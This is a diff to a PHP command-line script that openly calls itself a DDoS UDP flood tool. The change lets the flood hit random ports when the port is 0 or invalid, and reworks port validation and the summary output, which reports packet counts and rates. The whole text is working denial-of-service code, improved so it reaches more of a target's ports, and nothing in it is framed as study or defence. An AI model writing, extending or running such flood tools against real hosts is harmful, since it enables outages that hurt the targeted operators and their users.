@@ -84,11 +84,15 @@ function is_cli() {
 /**
  * UDP Connect
  * @param string 	$h Host name or ip address
- * @param integer 	$p Port number
+ * @param integer 	$p Port number, if the port is 0 then a random port will be used
  * @param string 	$out Data to send
  * @return boolean	True if the packet was sent
  */
 function udp_connect($h,$p,$out){
+	
+	if(0 == $p) {
+		$p = rand(1,rand(1,65535));
+	}
 
 	$fp = @fsockopen('udp://'.$h, $p, $errno, $errstr, 30);
 	
@@ -108,11 +112,10 @@ function udp_connect($h,$p,$out){
 /**
  * Sanitize the port number or return a random one
  * @param integer 	$port
- * @return integer 	Port number or random port
+ * @return integer 	Port number or 0 if invalid
  */
-function get_port($port = 0){
-	$port = intval($port);
-	return ($port >= 1 &&  $port <= 65535) ? $port : rand(1,65535);
+function validate_port($port = 0){
+	return ($port >= 1 &&  $port <= 65535) ? $port : 0;
 }
 
 /**
@@ -195,16 +198,20 @@ if(!empty($params['host']) && (is_numeric($params['time'])) || is_numeric($param
 		println("ERROR, Invalid host or IP address!");
 		exit(1);
 	}
+	$host = $params['host'];
+	
+	// Host
+	if(!validate_port($params['port'])) {
+		println("WARNING, Invalid port number, random ports will be used!");
+		$port = 0;
+	}
+	else {
+		$port = $params['port'];
+	}
 	
 	// Packets count
 	$packets = 0;
 
-	// TODO Validation for host 
-	$host = $params['host'];
-	
-	// Host
-	$port = get_port($params['port']);
-	
 	// Packet size
 	if(is_numeric($params['bytes'])) {
 		$packet_size = min($params['bytes'],DDOS_MAX_PACKET_SIZE);
@@ -259,7 +266,7 @@ if(!empty($params['host']) && (is_numeric($params['time'])) || is_numeric($param
 	println();
 	println("DDoS UDP flood completed"); 
 	println('Host: ' . $host);
-	println('Port: '. $port);
+	println('Port: '. ($port == 0 ? 'Radom ports' : $port));
 	println("Packets: " .$packets .' ('.format_bytes($packets*$packet_size) .')');
 	println("Duration: " .$timeStr);
 	println("Avarage: " . round($packets/$exec_time, 2).' packet/second');
